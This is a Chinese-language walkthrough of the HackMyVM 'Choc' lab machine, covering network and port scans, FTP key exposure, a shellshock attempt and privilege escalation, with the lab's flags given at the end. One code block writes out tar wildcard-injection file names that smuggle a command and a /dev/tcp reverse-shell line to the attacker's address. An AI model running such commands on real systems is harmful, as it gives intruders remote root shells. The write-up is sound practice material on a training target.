---
title: hackmyvm Choc靶机复盘
author: LingMj
data: 2025-05-17
categories: [hackmyvm]
tags: [tar, sudo(!root)]
description: 难度-Hard
---

## 网段扫描
```
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.64	a0:78:17:62:e5:0a	Apple, Inc.
192.168.137.155	3e:21:9c:12:bd:a3	(Unknown: locally administered)
```

## 端口扫描

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 05:43 EDT
Nmap scan report for choc.mshome.net (192.168.137.155)
Host is up (0.0055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0            1811 Apr 20  2021 id_rsa [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.137.190
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c5:66:48:ee:7b:a9:ef:e1:20:26:c5:a8:bf:c5:4d:5c (RSA)
|   256 80:46:cd:47:a1:ce:a7:fe:56:36:4f:f7:d1:ed:92:c0 (ECDSA)
|_  256 a2:83:db:7a:7d:38:70:e6:00:16:71:29:ee:04:73:aa (ED25519)
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.19 seconds
                                                                  
```

## 获取webshell
![picture 0](../assets/images/65a2a7c14ce6dadd2a090e3c3f4b2f130fe3e902a0d8d06c626b79361fc7f6f5.png)  
![picture 1](../assets/images/12c00f5f3d7a3882658914eb6837dda771713db0c462760b4af4bdacff3efb76.png)  
![picture 2](../assets/images/7103b4e0c71627caebe85ffe028e1e486c0960aad89c826f4916789424fac525.png)  
![picture 3](../assets/images/8b6c0599c1a4259455b87ccc1d5409ab5c6025d660e437c0512b27e7db9fff7a.png)  

>目前来说解决不了
>

![picture 4](../assets/images/385b2a84163b72f29862c28dc446d244266a3694c8808a36d086153d02333265.png)  

>找到了个尝试利用的方案：https://www.baeldung.com/linux/ssh-shellshock-exploit
>


## 提权


![picture 5](../assets/images/5b041ba4c6aae46f5f5a7268a5fbf50a9941b00226342f5b94ee35a3d2df608f.png)  
![picture 6](../assets/images/9490800d6e6d066a956776842fb8d14b26a7d8318aef96e53c53a31be3b81d56.png)  

>删掉这个没准可以登录上去
>

![picture 7](../assets/images/5539fe7759883a0898af0b65daf9efa0f06a60fb50627b70a72435d6bc3348e4.png)  

>还真是哈哈哈
>

![picture 8](../assets/images/ffc75650c778ede904ba75898a308565be744512d9bffb3c913c85e15f80a653.png)  

>这个的话没准是密码cupp -i
>

![picture 9](../assets/images/6273275863134a6acda6cbfbee1f6ed464c28cdd2d58579174da35496736f959.png)  
![picture 10](../assets/images/8069c7e9a861015c5a04c70a07ef2fdffe891fe38ee1be06ad0b55b93c4e37ea.png)  
![picture 11](../assets/images/327eb5ab777d6b444e6421ce429aef3ffd91e5042472538ddad6a7b5701f96b5.png)  
![picture 12](../assets/images/da34840c0b6bfe8fd9189340abf71a78d09d217ca945e16ff2de5ab7795e80a4.png)  
![picture 13](../assets/images/96e056ab88191ca682f3a4046abc72c43ca3aee35c2c09a2353adf14b6083c4b.png)  

>诶不对应该有个定时任务才对，检查一下
>

![picture 14](../assets/images/4c141347477115fe17f574e155794a1a894a39892c23bf2d667c9e4702034b51.png)  

>这才对嘛，还是大老靶机好猜方向
>

![picture 15](../assets/images/e598e54b31a1b67f25fd1937be159d1da7ac587f0781c207629a1e350c5bff93.png)  
![picture 16](../assets/images/98aec10f4baf99d306689eb08c0c44e0968f822bc2bedb18070d2c9e740768a6.png)  
![picture 17](../assets/images/7903ab29fadc98d88af75075b55675069b50b5a89bc8c55cdfc2f79dbadf0ef2.png)  

>没触发应该有什么问题比如文件对应操作
>

![picture 18](../assets/images/ef39496b9bbe0e45772125379516c5f055e0605534146de4e71e61542534708d.png)  
![picture 19](../assets/images/3a238a53792a584070bbdc6d61c5323b6a003e844a5522408c972c5342e08816.png)  

>想到个方式软连接一下应该就好了
>

![picture 20](../assets/images/d0369633a2220ea926a68a5a51c3efedeb4e5fa1c6552d9e9d135f785d145a02.png)  
![picture 21](../assets/images/c6b010bc33b7c9a4cfff1ad05afe28debbc6f3aab835767f1bd5f17c403409d3.png)  

>竟然不行
>

![picture 22](../assets/images/ebcb2ae153760c2e372137b0b9e38699268390dffaaa61f9986055f6fd957108.png)  
![picture 23](../assets/images/a024d8a9fc3634cc0faf5f93fd291ee846b99479baeae9b9e437a80bb77727db.png)  


```
carl@choc:/home/torki/secret_garden$ touch -- '--checkpoint=1'
carl@choc:/home/torki/secret_garden$ ls -al
total 12
drwxrwxrwx 2 torki torki 4096 May 17 14:08  .
drwxr-xr-x 6 torki torki 4096 Apr 19  2021  ..
-rw-r--r-- 1 carl  carl     0 May 17 14:08 '--checkpoint=1'
-rw-r--r-- 1 torki torki  325 Apr 20  2021  diary.bak
carl@choc:/home/torki/secret_garden$ touch '--checkpoint-action=exec=bash a.sh'
carl@choc:/home/torki/secret_garden$ echo '/bin/bash -i >& /dev/tcp/192.168.137.190/1234 0>&1' > a.sh
carl@choc:/home/torki/secret_garden$ chmod +x a.sh 
```

![picture 24](../assets/images/de8eef6b8c7a38630a8ca6dc213a005a8c2db650fb3d1fa61bed4929ebb87c2f.png)  
![picture 25](../assets/images/107a2d5c5751b3d9239d8abf7758be25e1fcb3793e7ff85cd318e4dcde01666e.png)  
![picture 26](../assets/images/06ca10fee52cb10f8eb26c920ce8281996fab230422d3a7877ddeaa2d2621a2b.png)  
![picture 27](../assets/images/2a5834d4e1f1e7ac45e9c9ddd3f98bd4a337116459ddcde5f621becd725ff3b2.png)  

>这个都不能访问怎么判断它干了什么
>

![picture 28](../assets/images/1e0596fbc818c6433b741f0767f5f82047b7e35cec41bcc31135ce488509a279.png)  
![picture 29](../assets/images/2a72c180af00c314286bcc053e289ed0d7889294f553ff18367f6cc56ca5e8e7.png)  

>exit 出现man直接！/bin/bash
>

![picture 30](../assets/images/75733b14746b030d2c63561f3a409d2d5fbdb7304c843dcb1ed2816ce9cfabd5.png)  

>又是这个！root
>

![picture 31](../assets/images/97e713bde878e89b18ea1bffbbd62cf1b1b3d5c5da7f4aa60cbf3b340b15a9c5.png)  
![picture 32](../assets/images/63cbbec0a36ee12c538c0fbbc70e9f6234980eb364aa9d6320e43814b9412347.png)  
![picture 33](../assets/images/af32aeaf2246f6bef643f6f292295e22460d4b077960a2182840f947ac618cba.png)  
![picture 34](../assets/images/772273e7f494f57c0ddf3baf4b2edf4b2841376d49965cc4dab6882f52eccb8b.png)  
![picture 35](../assets/images/e2755124be5d6ab75346655c0ae2a9a6803ddefa8ad477d53b36d768bb7ae504.png)  
![picture 36](../assets/images/cba6e804f0e2ee539e0769aa69120ff99dc78669bfec3c9fa4a117d150dcac86.png)  

![picture 38](../assets/images/a4cb92389a20258204907339aecda9ed453ef363b6e3c623167902d783494dc2.png)  

![picture 37](../assets/images/3d22075c3627afb6a2c3c0ef83d6c700936a6682f46ac8131c0a7efe53eb5d06.png)  

>我以为我openssh坏了，原来是空格向大佬找了方案
>

```
sed -r 's/[ ]+$//g' id
```

![picture 39](../assets/images/7af4c941ef9a339d2ec6548bb29dfde3a38fc3a70419975f3acb75b2c0d9ef63.png)  

>好了结束了
>

>userflag:commenquaded
>
>rootflag:inesbywal
>